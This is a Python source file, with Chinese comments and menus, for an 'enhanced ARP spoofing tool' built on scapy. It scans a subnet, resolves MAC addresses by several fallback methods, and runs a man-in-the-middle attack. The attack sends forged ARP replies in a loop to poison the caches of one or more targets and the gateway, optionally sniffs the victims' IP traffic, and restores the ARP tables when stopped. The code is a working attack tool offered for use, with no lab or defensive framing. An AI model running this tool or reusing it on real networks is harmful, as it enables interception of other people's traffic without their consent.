#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
增强版ARP欺骗工具
支持多目标攻击、流量监控、自动恢复等功能
"""

import socket
import time
import threading
import argparse
import subprocess
import sys
import signal
import re
from scapy.all import *
import os
from collections import defaultdict

class ARPSpoofAdvanced:
    def __init__(self):
        self.running = False
        self.threads = []
        self.packet_count = defaultdict(int)
        self.targets = []
        self.mac_cache = {}  # MAC地址缓存
        
    def check_root(self):
        """检查是否具有root权限"""
        if os.geteuid() != 0:
            print("[!] 需要root权限运行此工具")
            sys.exit(1)
    
    def get_local_ip(self):
        """获取本机IP地址"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def get_network_info(self):
        """获取网络信息"""
        try:
            result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                print("[*] 可用网络接口:")
                current_iface = ""
                for line in lines:
                    if line.strip().startswith('inet ') and 'scope global' in line:
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            ip = parts[1].split('/')[0]
                            if current_iface and current_iface != 'lo' and not current_iface.startswith('dummy'):
                                print(f"    - {current_iface}: {ip}")
                    elif ':' in line and line.strip().endswith(':'):
                        current_iface = line.split(':')[1].strip()
        except:
            print("[!] 无法获取网络信息")
    
    def test_mac_detection(self, test_ip=None):
        """测试MAC地址检测功能"""
        if not test_ip:
            # 获取网关IP进行测试
            gateway_info = self.get_gateway_info("eth0")
            if gateway_info:
                test_ip = gateway_info['ip']
            else:
                # 使用常见的本地网络IP
                local_ip = self.get_local_ip()
                if local_ip and local_ip != "127.0.0.1":
                    test_ip = ".".join(local_ip.split(".")[:-1]) + ".1"  # 网关通常是.x.1
                else:
                    test_ip = "192.168.1.1"  # 默认网关IP
        
        print(f"\n[*] 测试MAC地址检测功能")
        print(f"[*] 测试IP: {test_ip}")
        
        # 清空缓存重新测试
        if test_ip in self.mac_cache:
            del self.mac_cache[test_ip]
        
        mac = self.get_mac_address(test_ip)
        print(f"[*] 检测结果: {mac}")
        
        if self.is_valid_mac(mac):
            print("[+] MAC地址检测成功!")
        else:
            print("[!] MAC地址检测失败")
        
        return mac
    
    def diagnose_network_issue(self, target_ip=None):
        """诊断网络连接和MAC检测问题"""
        if not target_ip:
            local_ip = self.get_local_ip()
            if local_ip and local_ip != "127.0.0.1":
                target_ip = ".".join(local_ip.split(".")[:-1]) + ".1"
            else:
                target_ip = "192.168.1.1"
        
        print(f"\n[*] 开始网络诊断 - 目标IP: {target_ip}")
        print("=" * 50)
        
        # 1. 检查网络连接
        print("\n[1] 检查网络连接状态:")
        try:
            # 检查本机网络接口
            result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True)
            if result.returncode == 0:
                print("[+] 网络接口状态正常")
                # 提取当前使用的接口
                lines = result.stdout.split('\n')
                current_iface = ""
                for line in lines:
                    if 'state UP' in line:
                        if ':' in line:
                            current_iface = line.split(':')[1].strip()
                            print(f"    - 活动接口: {current_iface}")
                            break
            else:
                print("[!] 无法获取网络接口信息")
        except Exception as e:
            print(f"[!] 网络接口检查失败: {e}")
        
        # 2. 检查路由表
        print("\n[2] 检查路由表:")
        try:
            result = subprocess.run(['ip', 'route', 'show'], capture_output=True, text=True)
            if result.returncode == 0:
                print("[+] 路由表信息:")
                for line in result.stdout.strip().split('\n'):
                    if 'default' in line or target_ip.split('.')[0] in line:
                        print(f"    - {line}")
            else:
                print("[!] 无法获取路由表")
        except Exception as e:
            print(f"[!] 路由表检查失败: {e}")
        
        # 3. 检查ARP表
        print("\n[3] 检查ARP表:")
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            if result.returncode == 0:
                if result.stdout.strip():
                    print("[+] ARP表内容:")
                    for line in result.stdout.strip().split('\n'):
                        if target_ip in line:
                            print(f"    - {line}")
                else:
                    print("[!] ARP表为空")
            else:
                print("[!] 无法获取ARP表")
        except Exception as e:
            print(f"[!] ARP表检查失败: {e}")
        
        # 4. 测试网络连通性
        print(f"\n[4] 测试与 {target_ip} 的连通性:")
        try:
            result = subprocess.run(['ping', '-c', '3', '-W', '2', target_ip], capture_output=True, text=True)
            if result.returncode == 0:
                print("[+] 网络连通性正常")
                # 分析ping结果
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'packets transmitted' in line:
                        print(f"    - {line}")
            else:
                print("[!] 网络不通或目标主机不响应")
                print(f"    - 错误信息: {result.stderr}")
        except Exception as e:
            print(f"[!] Ping测试失败: {e}")
        
        # 5. 检查防火墙和网络策略
        print("\n[5] 检查可能的网络限制:")
        print("    - 某些WiFi网络可能启用客户端隔离(AP隔离)")
        print("    - 企业网络可能有ARP过滤或安全策略")
        print("    - 路由器可能限制ARP请求")
        
        # 6. 尝试特殊检测方法
        print(f"\n[6] 尝试特殊检测方法:")
        
        # 检查是否在同一子网
        local_ip = self.get_local_ip()
        if local_ip and local_ip != "127.0.0.1":
            local_net = ".".join(local_ip.split(".")[:3])
            target_net = ".".join(target_ip.split(".")[:3])
            
            if local_net != target_net:
                print(f"[!] 警告: 目标IP {target_ip} 不在本地子网 {local_net}.x")
                print("    - 跨子网的MAC检测需要路由器支持")
            else:
                print("[+] 目标IP在同一子网内")
        
        # 7. 建议解决方案
        print("\n[7] 可能的解决方案:")
        print("    - 尝试连接到其他WiFi网络测试")
        print("    - 检查路由器是否启用客户端隔离")
        print("    - 尝试使用有线网络连接")
        print("    - 联系网络管理员检查网络策略")
        
        print("\n" + "=" * 50)
        print("[*] 网络诊断完成")
        
        return True
    
    def scan_network(self, subnet):
        """高级网络扫描"""
        print(f"[*] 正在深度扫描子网: {subnet}")
        
        try:
            # 使用nmap进行详细扫描
            cmd = f"nmap -sn -PR {subnet}"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            hosts = []
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                
                for i, line in enumerate(lines):
                    if 'Nmap scan report for' in line:
                        parts = line.split()
                        if len(parts) >= 5:
                            ip = parts[-1].strip('()')
                            
                            # 获取MAC地址
                            mac = "未知"
                            if i + 1 < len(lines) and 'MAC Address' in lines[i + 1]:
                                mac_parts = lines[i + 1].split()
                                if len(mac_parts) >= 3:
                                    mac = mac_parts[2]
                            
                            # 获取主机名
                            hostname = parts[4] if len(parts) > 4 else "未知"
                            
                            hosts.append({
                                'ip': ip,
                                'mac': mac,
                                'hostname': hostname
                            })
                
                print(f"[+] 发现 {len(hosts)} 个在线主机:")
                for host in hosts:
                    print(f"    - IP: {host['ip']}, MAC: {host['mac']}, 主机名: {host['hostname']}")
                
                return hosts
            else:
                print("[!] nmap扫描失败")
                return []
                
        except Exception as e:
            print(f"[!] 网络扫描错误: {e}")
            return []
    
    def is_valid_mac(self, mac):
        """验证MAC地址格式是否正确"""
        if not mac or mac == "未知" or mac.lower() == "none":
            return False
        
        # 检查MAC地址格式 (xx:xx:xx:xx:xx:xx 或 xx-xx-xx-xx-xx-xx)
        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(mac_pattern.match(mac))
    
    def get_mac_address(self, ip_address, max_retries=5):
        """增强版MAC地址获取函数，包含多方法和重试机制"""
        
        # 检查缓存
        if ip_address in self.mac_cache:
            cached_mac = self.mac_cache[ip_address]
            if self.is_valid_mac(cached_mac):
                return cached_mac
        
        mac_address = None
        methods_tried = []
        
        for attempt in range(max_retries):
            try:
                print(f"[*] 尝试获取 {ip_address} 的MAC地址 (第 {attempt + 1}/{max_retries} 次尝试)")
                
                # 方法1: 使用scapy的getmacbyip
                methods_tried.append("scapy")
                mac_address = getmacbyip(ip_address)
                if self.is_valid_mac(mac_address):
                    print(f"[+] 通过scapy获取到MAC地址: {mac_address}")
                    break
                
                # 方法2: 使用arp命令 (不同格式)
                methods_tried.append("arp -a")
                result = subprocess.run(['arp', '-a', ip_address], capture_output=True, text=True)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ip_address in line:
                            parts = line.split()
                            if len(parts) >= 4:
                                mac_candidate = parts[3]
                                if self.is_valid_mac(mac_candidate):
                                    mac_address = mac_candidate
                                    print(f"[+] 通过arp -a获取到MAC地址: {mac_address}")
                                    break
                
                if self.is_valid_mac(mac_address):
                    break
                
                # 方法3: 使用arp命令 (另一种格式)
                methods_tried.append("arp -n")
                result = subprocess.run(['arp', '-n', ip_address], capture_output=True, text=True)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ip_address in line:
                            parts = line.split()
                            for i, part in enumerate(parts):
                                if self.is_valid_mac(part):
                                    mac_address = part
                                    print(f"[+] 通过arp -n获取到MAC地址: {mac_address}")
                                    break
                
                if self.is_valid_mac(mac_address):
                    break
                
                # 方法4: 使用arping命令主动探测
                methods_tried.append("arping")
                print(f"[*] 使用arping主动探测 {ip_address}")
                result = subprocess.run(['arping', '-c', '3', '-w', '2', ip_address], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    # 发送ARP请求后，等待并再次尝试获取MAC
                    time.sleep(3)
                    mac_address = getmacbyip(ip_address)
                    if self.is_valid_mac(mac_address):
                        print(f"[+] 通过arping获取到MAC地址: {mac_address}")
                        break
                
                # 方法5: 使用ip neighbor命令
                methods_tried.append("ip neighbor")
                result = subprocess.run(['ip', 'neighbor', 'show', ip_address], capture_output=True, text=True)
                if result.returncode == 0 and result.stdout.strip():
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ip_address in line:
                            parts = line.split()
                            if len(parts) >= 5:
                                mac_candidate = parts[4]
                                if self.is_valid_mac(mac_candidate):
                                    mac_address = mac_candidate
                                    print(f"[+] 通过ip neighbor获取到MAC地址: {mac_address}")
                                    break
                
                if self.is_valid_mac(mac_address):
                    break
                
                # 方法6: 使用nmap进行ARP扫描
                methods_tried.append("nmap")
                print(f"[*] 使用nmap扫描 {ip_address}")
                result = subprocess.run(['nmap', '-sn', '-PR', ip_address], capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for i, line in enumerate(lines):
                        if ip_address in line and 'Nmap scan report for' in line:
                            if i + 1 < len(lines) and 'MAC Address' in lines[i + 1]:
                                mac_parts = lines[i + 1].split()
                                if len(mac_parts) >= 3:
                                    mac_candidate = mac_parts[2]
                                    if self.is_valid_mac(mac_candidate):
                                        mac_address = mac_candidate
                                        print(f"[+] 通过nmap获取到MAC地址: {mac_address}")
                                        break
                
                if self.is_valid_mac(mac_address):
                    break
                
                # 方法7: 使用ping确认主机在线后再尝试
                methods_tried.append("ping")
                print(f"[*] 使用ping确认 {ip_address} 是否在线")
                result = subprocess.run(['ping', '-c', '2', '-W', '1', ip_address], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    print(f"[+] {ip_address} 在线，重新尝试获取MAC")
                    # 主机在线，重新尝试所有方法
                    time.sleep(1)
                    continue
                else:
                    print(f"[!] {ip_address} 可能不在线或网络不通")
                    # 对于WiFi网络，可能是客户端隔离，尝试特殊方法
                    if attempt == max_retries - 1:  # 最后一次尝试
                        print("[*] 尝试WiFi网络特殊检测方法")
                        # 在WiFi网络中，网关通常能响应
                        try:
                            # 尝试获取网关MAC
                            gateway_info = self.get_gateway_info("wlan0")
                            if gateway_info and gateway_info['ip']:
                                print(f"[*] 检测到网关: {gateway_info['ip']}")
                                # 如果目标不是网关，可能是客户端隔离
                                if ip_address != gateway_info['ip']:
                                    print("[!] 可能遇到WiFi客户端隔离，无法直接获取其他客户端MAC")
                        except:
                            pass
                
                # 等待后重试
                if attempt < max_retries - 1:
                    wait_time = 3 + attempt  # 递增等待时间
                    print(f"[*] 等待 {wait_time} 秒后重试...")
                    time.sleep(wait_time)
                    
            except subprocess.TimeoutExpired:
                print(f"[!] 命令执行超时 (尝试 {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(3)
            except Exception as e:
                print(f"[!] 获取MAC地址失败 (尝试 {attempt + 1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    time.sleep(3)
        
        # 如果所有方法都失败，尝试最后的应急方法
        if not self.is_valid_mac(mac_address):
            print(f"[!] 无法获取 {ip_address} 的MAC地址 (尝试的方法: {', '.join(set(methods_tried))})")
            
            # 尝试使用广播ARP请求
            try:
                print(f"[*] 尝试广播ARP请求获取 {ip_address} 的MAC")
                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
                result = srp(arp_request, timeout=2, verbose=0)
                if result and result[0]:
                    for sent, received in result[0]:
                        if received.haslayer(ARP):
                            mac_address = received[ARP].hwsrc
                            if self.is_valid_mac(mac_address):
                                print(f"[+] 通过广播ARP获取到MAC地址: {mac_address}")
                                break
            except Exception as e:
                print(f"[!] 广播ARP请求失败: {e}")
            
            # WiFi网络特殊处理
            if not self.is_valid_mac(mac_address):
                print("[*] 尝试WiFi网络特殊检测")
                try:
                    # 检查是否为WiFi网络
                    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                    if result.returncode == 0 and 'IEEE 802.11' in result.stdout:
                        print("[+] 检测到WiFi网络连接")
                        
                        # WiFi网络常见问题分析
                        local_ip = self.get_local_ip()
                        if local_ip and local_ip != "127.0.0.1":
                            local_net = ".".join(local_ip.split(".")[:3])
                            target_net = ".".join(ip_address.split(".")[:3])
                            
                            if local_net == target_net:
                                print("[!] 可能遇到WiFi客户端隔离(AP隔离)")
                                print("    - 这是公共WiFi的安全特性")
                                print("    - 防止设备间直接通信")
                                print("    - 只能与网关通信")
                            else:
                                print("[!] 目标不在同一子网，需要路由器转发")
                except:
                    pass
            
            # 如果仍然失败，返回默认值
            if not self.is_valid_mac(mac_address):
                mac_address = "未知"
                print(f"[!] 最终无法获取 {ip_address} 的MAC地址")
                print("[*] 建议:")
                print("    - 检查是否启用WiFi客户端隔离")
                print("    - 尝试连接到其他网络测试")
                print("    - 使用有线网络连接")
        
        # 更新缓存
        self.mac_cache[ip_address] = mac_address
        
        return mac_address
    
    def get_gateway_info(self, interface):
        """获取网关信息"""
        try:
            result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'default via' in line and interface in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            gateway_ip = parts[2]
                            gateway_mac = self.get_mac_address(gateway_ip)
                            
                            return {
                                'ip': gateway_ip,
                                'mac': gateway_mac,
                                'interface': interface
                            }
        except:
            pass
        
        return None
    
    def arp_spoof_single(self, target_ip, gateway_ip, interface):
        """单目标ARP欺骗"""
        print(f"[*] 开始ARP欺骗: {target_ip} -> {gateway_ip}")
        
        try:
            # 获取MAC地址
            gateway_mac = self.get_mac_address(gateway_ip)
            target_mac = self.get_mac_address(target_ip)
            local_mac = get_if_hwaddr(interface)
            
            print(f"[*] 目标MAC: {target_mac}")
            print(f"[*] 网关MAC: {gateway_mac}")
            print(f"[*] 本机MAC: {local_mac}")
            
            # 检查MAC地址是否有效
            if not self.is_valid_mac(target_mac):
                print(f"[!] 警告: 目标 {target_ip} 的MAC地址无效 ({target_mac})")
            if not self.is_valid_mac(gateway_mac):
                print(f"[!] 警告: 网关 {gateway_ip} 的MAC地址无效 ({gateway_mac})")
            
            packet_count = 0
            
            while self.running:
                try:
                    # 构造ARP欺骗包
                    target_packet = Ether(dst=target_mac, src=local_mac) / ARP(
                        op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=local_mac
                    )
                    
                    gateway_packet = Ether(dst=gateway_mac, src=local_mac) / ARP(
                        op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=local_mac
                    )
                    
                    # 发送ARP包
                    sendp(target_packet, iface=interface, verbose=0)
                    sendp(gateway_packet, iface=interface, verbose=0)
                    
                    packet_count += 2
                    self.packet_count[target_ip] = packet_count
                    
                    # 每10个包显示一次状态
                    if packet_count % 10 == 0:
                        print(f"[*] {target_ip}: 已发送 {packet_count} 个ARP包")
                    
                    time.sleep(1)
                    
                except Exception as e:
                    print(f"[!] ARP欺骗错误 ({target_ip}): {e}")
                    time.sleep(2)
                    
        except Exception as e:
            print(f"[!] ARP欺骗初始化错误: {e}")
    
    def arp_spoof_multiple(self, target_ips, gateway_ip, interface):
        """多目标ARP欺骗"""
        print(f"[*] 开始多目标ARP欺骗: {len(target_ips)} 个目标")
        
        for target_ip in target_ips:
            thread = threading.Thread(target=self.arp_spoof_single, args=(target_ip, gateway_ip, interface))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def packet_sniffer(self, interface):
        """数据包嗅探器"""
        print(f"[*] 启动数据包嗅探器: {interface}")
        
        def packet_handler(packet):
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                if src_ip in self.targets or dst_ip in self.targets:
                    print(f"[流量] {src_ip} -> {dst_ip} ({packet.summary()})")
        
        try:
            sniff(iface=interface, prn=packet_handler, store=0, filter="ip", stop_filter=lambda x: not self.running)
        except Exception as e:
            print(f"[!] 数据包嗅探错误: {e}")
    
    def restore_arp(self, target_ip, gateway_ip, interface):
        """恢复ARP表"""
        print(f"[*] 恢复ARP表: {target_ip} <-> {gateway_ip}")
        
        try:
            # 获取真实MAC地址
            target_mac = self.get_mac_address(target_ip)
            gateway_mac = self.get_mac_address(gateway_ip)
            
            if target_mac and gateway_mac and self.is_valid_mac(target_mac) and self.is_valid_mac(gateway_mac):
                # 发送正确的ARP包
                target_restore = Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac
                )
                
                gateway_restore = Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac
                )
                
                # 发送多个恢复包确保生效
                for _ in range(5):
                    sendp(target_restore, iface=interface, verbose=0)
                    sendp(gateway_restore, iface=interface, verbose=0)
                    time.sleep(0.5)
                
                print(f"[+] ARP表恢复完成: {target_ip}")
            else:
                print(f"[!] 无法恢复ARP表: MAC地址无效或获取失败")
            
        except Exception as e:
            print(f"[!] ARP恢复错误 ({target_ip}): {e}")
    
    def start_attack(self, target_ips, gateway_ip, interface, enable_sniffing=False):
        """启动攻击"""
        self.running = True
        self.targets = target_ips
        
        # 启动ARP欺骗
        self.arp_spoof_multiple(target_ips, gateway_ip, interface)
        
        # 启动数据包嗅探
        if enable_sniffing:
            sniff_thread = threading.Thread(target=self.packet_sniffer, args=(interface,))
            sniff_thread.daemon = True
            sniff_thread.start()
            self.threads.append(sniff_thread)
        
        # 状态监控线程
        def status_monitor():
            while self.running:
                total_packets = sum(self.packet_count.values())
                print(f"[*] 状态: 总包数 {total_packets}, 活跃目标 {len([x for x in self.packet_count.values() if x > 0])}")
                time.sleep(10)
        
        monitor_thread = threading.Thread(target=status_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        self.threads.append(monitor_thread)
    
    def stop_attack(self, target_ips, gateway_ip, interface):
        """停止攻击并恢复ARP表"""
        print("[*] 正在停止攻击...")
        self.running = False
        
        # 恢复所有目标的ARP表
        for target_ip in target_ips:
            self.restore_arp(target_ip, gateway_ip, interface)
        
        # 等待线程结束
        for thread in self.threads:
            thread.join(timeout=3)
        
        self.threads.clear()
        print("[+] 攻击已停止，ARP表已恢复")

def signal_handler(signum, frame):
    """信号处理函数"""
    print("\n[*] 收到中断信号，正在停止...")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='增强版ARP欺骗工具')
    parser.add_argument('-t', '--targets', nargs='+', help='目标IP地址列表')
    parser.add_argument('-g', '--gateway', help='网关IP地址')
    parser.add_argument('-i', '--interface', help='网络接口')
    parser.add_argument('-s', '--subnet', help='扫描子网 (例如: 192.168.1.0/24)')
    parser.add_argument('--sniff', action='store_true', help='启用数据包嗅探')
    parser.add_argument('--auto-gateway', action='store_true', help='自动检测网关')
    
    args = parser.parse_args()
    
    tool = ARPSpoofAdvanced()
    
    # 检查root权限
    tool.check_root()
    
    # 注册信号处理
    signal.signal(signal.SIGINT, signal_handler)
    
    # 显示网络信息
    tool.get_network_info()
    
    # 扫描模式
    if args.subnet:
        tool.scan_network(args.subnet)
        return
    
    # 攻击模式
    if not args.targets:
        print("[!] 必须指定目标IP地址")
        return
    
    # 获取网关
    gateway_ip = args.gateway
    if args.auto_gateway and args.interface:
        gateway_info = tool.get_gateway_info(args.interface)
        if gateway_info:
            gateway_ip = gateway_info['ip']
            print(f"[*] 自动检测到网关: {gateway_ip}")
    
    if not gateway_ip:
        print("[!] 必须指定网关IP地址或使用--auto-gateway")
        return
    
    if not args.interface:
        print("[!] 必须指定网络接口")
        return
    
    try:
        print(f"[*] 开始ARP欺骗攻击")
        print(f"[*] 目标: {', '.join(args.targets)}")
        print(f"[*] 网关: {gateway_ip}")
        print(f"[*] 接口: {args.interface}")
        print(f"[*] 嗅探: {'启用' if args.sniff else '禁用'}")
        
        tool.start_attack(args.targets, gateway_ip, args.interface, args.sniff)
        
        print("[*] 攻击进行中... 按Ctrl+C停止")
        
        # 等待用户中断
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            tool.stop_attack(args.targets, gateway_ip, args.interface)
            
    except Exception as e:
        print(f"[!] 错误: {e}")
        tool.stop_attack(args.targets, gateway_ip, args.interface)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║        “我或曾梦见，与你亲密无间”
    醒来后发现，你我形同陌路”  ARP欺骗工具             ║
    ║               午安午安啦
    ╚═══════════════════════════════════════╝
    """)
    
    if len(sys.argv) == 1:
        # 交互模式
        tool = ARPSpoofAdvanced()
        tool.check_root()
        
        print("\n=== ARP欺骗工具 ===")
        print("1. 扫描网络")
        print("2. 单目标ARP欺骗")
        print("3. 多目标ARP欺骗")
        print("4. 网络信息")
        print("5. 测试MAC地址检测")
        print("6. 网络问题诊断")
        print("0. 退出")
        
        while True:
            try:
                choice = input("\n请选择模式: ").strip()
                
                if choice == '0':
                    break
                elif choice == '1':
                    subnet = input("请输入子网 (例如 192.168.1.0/24): ").strip()
                    if not subnet:
                        local_ip = tool.get_local_ip()
                        subnet = f"{'.'.join(local_ip.split('.')[:3])}.0/24"
                    tool.scan_network(subnet)
                elif choice == '2':
                    target_ip = input("请输入目标IP: ").strip()
                    gateway_ip = input("请输入网关IP: ").strip()
                    interface = input("请输入网络接口: ").strip()
                    sniff_choice = input("启用数据包嗅探? (y/n): ").strip().lower()
                    
                    tool.start_attack([target_ip], gateway_ip, interface, sniff_choice == 'y')
                    input("按Enter键停止攻击...")
                    tool.stop_attack([target_ip], gateway_ip, interface)
                elif choice == '3':
                    targets_input = input("请输入目标IP列表 (用空格分隔): ").strip()
                    target_ips = targets_input.split()
                    gateway_ip = input("请输入网关IP: ").strip()
                    interface = input("请输入网络接口: ").strip()
                    sniff_choice = input("启用数据包嗅探? (y/n): ").strip().lower()
                    
                    tool.start_attack(target_ips, gateway_ip, interface, sniff_choice == 'y')
                    input("按Enter键停止攻击...")
                    tool.stop_attack(target_ips, gateway_ip, interface)
                elif choice == '4':
                    tool.get_network_info()
                elif choice == '5':
                    test_ip = input("请输入要测试的IP地址 (留空使用默认网关): ").strip()
                    if not test_ip:
                        tool.test_mac_detection()
                    else:
                        tool.test_mac_detection(test_ip)
                elif choice == '6':
                    diag_ip = input("请输入要诊断的IP地址 (留空使用默认网关): ").strip()
                    if not diag_ip:
                        tool.diagnose_network_issue()
                    else:
                        tool.diagnose_network_issue(diag_ip)
                else:
                    print("无效的选择")
                    
            except KeyboardInterrupt:
                print("\n[*] 退出程序")
                break
            except Exception as e:
                print(f"错误: {e}")
    else:
        # 命令行模式
        main()